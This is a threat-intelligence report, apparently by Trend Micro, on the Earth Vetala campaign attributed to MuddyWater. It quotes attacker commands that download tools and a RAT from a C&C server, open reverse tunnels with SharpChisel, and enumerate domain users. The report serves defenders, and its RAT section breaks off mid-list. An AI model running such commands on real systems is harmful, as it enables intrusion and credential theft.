	<h1 class="article-details__title">Earth Vetala – MuddyWater Continues to Target Organizations in the Middle East </h1>
	<p class="article-details__description">Trend Micro researchers recently detected activity suspected to be from MuddyWater. This campaign targets various organizations in the Middle East and neighboring regions.</p>
	<p class="article-details__author-by">By: Adi Peretz, Erick Thek
		
			<time class="article-details__date">March 05, 2021</time>

            <div class="richText">
	
    


	
		<div>
			<p>Trend Micro researchers recently detected activity targeting various organizations in the Middle East and neighboring regions. We were tipped off to this activity in part by research from <a href="https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies">Anomali</a>, which also identified a campaign targeting similar victims. We believe (with moderate confidence) that this newly identified activity is connected to <a href="https://www.trendmicro.com/en_us/research/18/c/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia.html">MuddyWater</a> (also known as TEMP.Zagros, Static Kitten, Seedworm).</p>
<p>Additionally, we were able to link the Anomali-identified activity to an ongoing campaign in 2021. This campaign uses the following legitimate remote admin tools such as:</p>
<ul>
<li><span class="rte-red-bullet"><a href="https://www.connectwise.com/company/announcements/screenconnect-now-connectwise-control">ScreenConnect</a></span></li>
<li><span class="rte-red-bullet"><a href="https://www.remoteutilities.com/">RemoteUtilities</a></span></li>
</ul>
<p>We have named this intrusion set Earth Vetala. Earth Vetala used spearphishing emails with embedded links to a legitimate file-sharing service to distribute their malicious package. The links were embedded within lure documents as well as emails.</p>
<p>Once a victim was accessed, attackers would determine if the user account was an administrator or normal user. They would then download post-exploitation tools that included password/process-dumping utilities, reverse-tunneling tools, and custom backdoors. The threat actors would then initiate communications with additional command-and-control (C&amp;C) infrastructure to execute obfuscated PowerShell scripts.</p>
<p><b><u><span class="body-subhead-title">Overview</span></u></b></p>
<p>Analysis indicates the Earth Vetala campaign is ongoing and that this threat actor has interests which appear to align with Iran.</p>
<p>Earth Vetala historically targets countries in the Middle East. In this campaign, Earth Vetala threat actors used spearphishing emails and lure documents against organizations within the United Arab Emirates, Saudi Arabia, Israel, and Azerbaijan. The phishing emails and lure documents contain embedded URLs linking to a legitimate file-sharing service to distribute archives containing the ScreenConnect remote administrator tool. ScreenConnect is a legitimate application that allows systems administrators to manage their enterprise systems remotely.</p>
<p>Our research found threat indicators that were connected to the same campaign identified by Anomali. Analysis indicates that Earth Vetala is still ongoing as of the publishing of this post. During this campaign, threat actors used post-exploitation tools to dump passwords, tunnel their C&amp;C communication using open-source tools, and use additional C&amp;C infrastructure to establish a persistent presence within targeted hosts and environments.</p>
<p><b><u><span class="body-subhead-title">Technical Analysis</span></u></b></p>
<p>During our research, we observed a spearphishing email allegedly from a government agency.</p>

		</div>
	

</div>
            <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/21/c/earth-vetala-muddywater-continues-to-target-organizations-in-the-middle-east/earth-vetala-1%20-%20Copy.png" alt="Phishing Email with the embedded URL"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 1. Phishing Email with the embedded URL</figcaption>
			
		</div>
	</figure>

</div>
            <div>




    
    
    <div class="richText">
	
    


	
		<div>
			<p>The email attempts to convince recipients to click the URL and download a malicious file. We have seen that one of two files may be downloaded, one being a .PDF file and the other an .RTF file.</p>

		</div>
	

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>As with the spearphishing email, the lure documents' content attempts to convince the victim to click on another malicious URL and download a .ZIP file.</p>
<p>The .ZIP file contains a copy of a legitimate remote administration software developed by <a href="https://www.remoteutilities.com/">RemoteUtilities</a> and provides remote administration capabilities, including:</p>
<ul>
<li><span class="rte-red-bullet">Downloading and uploading files</span></li>
<li><span class="rte-red-bullet">Grabbing screenshots</span></li>
<li><span class="rte-red-bullet">Browsing files and directories</span></li>
<li><span class="rte-red-bullet">Executing and terminating processes</span></li>
</ul>
<p>During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample. The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used. Otherwise, the TTPs in use remain broadly similar.</p>
<p><b><u><span class="body-subhead-title">RemoteUtilities Analysis</span></u></b></p>
<p>When the RemoteUtilities software is executed, its process launches <i>msiexec.exe</i> with the following command:</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/21/c/earth-vetala-muddywater-continues-to-target-organizations-in-the-middle-east/earth-vetala-4.png" alt="Figure 2. RemoteUtilities Installation"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 4. RemoteUtilities Installation</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>The MSI installer installs a service on the victim machine called <i>Remote Utilities – Host:</i></p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/21/c/earth-vetala-muddywater-continues-to-target-organizations-in-the-middle-east/earth-vetala-5.png" alt="Figure 3. Remote Utilities Service"/>
		
		<div class="caption-image-container ">
			<figcaption>Figure 5. Remote Utilities Service</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>The service then communicates with the domain <i>id.remoteutilities.com, </i>which belongs to RemoteUtilities. This connection is related to one of its features called Internet-ID Connection. This feature allows an intermediary Internet server to broker the connection, similar to a proxy server. This allows the threat actor to connect to the Internet-ID server, which then connects to the actual RemoteUtilities host.</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/21/c/earth-vetala-muddywater-continues-to-target-organizations-in-the-middle-east/earth-vetala-6.png" alt="Figure 4. id-server connection"/>

	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p><b><u>Post-Exploitation Analysis</u></b></p>
<p>During our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software. They were targeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a ScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)</p>
<p>As noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at <i>instance-sy9at2-relay.screenconnect.com</i> and resolves to 51.68.244.39.</p>
<p>The same domain was mentioned in the previous research. We then observed the threat actors interact with the compromised host using the ScreenConnect software, executing the following commands.</p>
<p><span class="blockquote">cmd.exe net user /domain</span></p>
<p>The command above allows the attacker to get all the users from the domain controller.</p>
<p>The next command executed is the following:</p>
<p><span class="blockquote">powershell.exe -exec bypass -w 1 -file a.ps1</span></p>
<p>This is a command to execute a PowerShell script of some kind. However, we did not have access to the <i>a.ps1</i> file. We are not sure what functionality is provided here.</p>
<p>The next command issued is the following:</p>
<p><span class="blockquote">powershell.exe iwr -uri http://87.236.212[.]184/SharpChisel.exe -outfile c:\programdata\SharpChisel.exe -usebasicparsing</span></p>
<p>The command is connected to 187.236.212[.]184 and downloads a file called <i>SharpChisel.exe</i> (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\programdata directory. The name <i>SharpChisel</i> may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called <i>chisel</i>. The above IP address is geolocated to a server in Iran.</p>
<p>The following command then configures SharpChisel:</p>
<p><span class="blockquote">C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999</span></p>
<p>This directs all traffic to the localhost at port 9999 to the same remote server.</p>
<p>Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:</p>
<p><span class="blockquote">powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:443 R:8888:127.0.0.1:9999</span></p>
<p>This time, traffic will be forwarded to the server over port 443.</p>
<p>A third SharpChisel instance that connects to a different C&amp;C server at 23.95.215.100:8080 is started via the following command:</p>
<p><span class="blockquote">C:\programdata\SharpChisel.exe client 23.95.215[.]100:8080 r:8888:127.0.0.1:9999</span></p>
<p>It is then configured with the following command line PowerShell command:</p>
<p><span class="blockquote">powershell.exe C:\programdata\SharpChisel.exe client 23.95.215[.]100:8080 R:8888:127.0.0.1:9999</span></p>
<p>We believe that the threat actor was unable to configure SharpChisel to work correctly. The use of the following command provides additional evidence to support our assumption:</p>
<p><span class="blockquote">powershell.exe iwr -uri hxxp://87.236.212[.]184/procdump64.exe -outfile c:\programdata\procdump64.exe -usebasicparsing</span></p>
<p>The command connects to the C&amp;C server, downloads <i>procdump64.exe,</i> and saves the file in the C:\programdata directory. That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate <i>procdump64.exe</i> utility.</p>

		</div>
	

</div>


    
    
    <div class="image">
	
    


	<figure class="image-figure">
		
			<img src="/content/dam/trendmicro/global/en/research/21/c/earth-vetala-muddywater-continues-to-target-organizations-in-the-middle-east/earth-vetala-7.png" alt=" Figure 5. LIGOLO execution example"/>
		
		<div class="caption-image-container ">
			<figcaption> Figure 7. LIGOLO execution example</figcaption>
			
		</div>
	</figure>

</div>


    
    
    <div class="richText">
	
    


	
		<div>
			<p>This was done using two separate commands:</p>
<p><span class="blockquote">C:\programdate\1.exe -relayserver 87.236.212[.]184:5555<br />
</span> <span class="blockquote">C:\users\public\new.exe -relayserver 87.236.212[.]184:5555</span></p>
<p>We then see the threat actor again attempting to use SharpChisel several times using the following command:</p>
<p><span class="blockquote">C:\programdata\SharpChisel.exe  client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999<br />
 powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999</span></p>
<p>We conclude that a tunneling connection to the C&amp;C server could not be established, even after attempts to do so with two different tools.</p>
<p>Following the unsuccessful attempt to configure a tunnel connection to their C&amp;C server, the threat actors downloaded a remote access tool (RAT) and attempted to configure it. The following PowerShell command was used for this:</p>
<p><span class="blockquote">powershell.exe iwr -uri hxxp://87.236.212[.]184/out1 -outfile c:\users\public\out1.exe -usebasicparsing</span></p>
<p>The command downloads <i>out1.exe</i> and saves the file in the <i>C:\users\public\ directory</i>. Using a UPX unpacker, we were able to extract the contents, which consists of a Python executable. We then decompiled the python executable using <a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">pyinstxtractor.py</a> to get all of the Python bytecode files. These are then decompiled to get the original python code using <a href="https://sourceforge.net/projects/easypythondecompiler/">easypythondecompiler</a>.</p>
<p>The out1.exe RAT has the following capabilities:</p>
<ul>
<li><span class="rte-red-bullet">Data encoding</span></li>
<li><span class="rte-red-bullet">Email parsing</span></li>

<p><b><u>Trend Micro Solutions</u></b></p>
<p>Earth Vetala represents an interesting threat. While it possesses remote access capabilities, the attackers seem to lack the expertise to use all of these tools correctly. This is unexpected since we believe this attack is connected to the MuddyWater threat actors — and in other connected campaigns, the attackers have shown higher levels of technical skill.</p>
